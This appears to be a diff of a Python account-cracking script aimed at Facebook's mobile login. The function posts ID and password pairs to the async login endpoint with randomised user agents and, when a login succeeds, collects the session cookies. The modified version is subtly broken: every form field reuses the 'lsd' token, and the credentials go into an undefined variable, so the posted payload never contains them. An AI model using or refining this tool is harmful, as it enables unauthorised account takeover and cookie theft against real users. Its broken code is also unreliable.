@@ -1235,34 +1235,20 @@ def m6(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
-   log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
-   header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "csettest":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "version":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "ajax":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "width":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "pxr":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "gps":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "dimensions":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
+   data['email'] = idf
+   data['pass'] = ps
+   data['login'] = 'Log In'  
+   lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
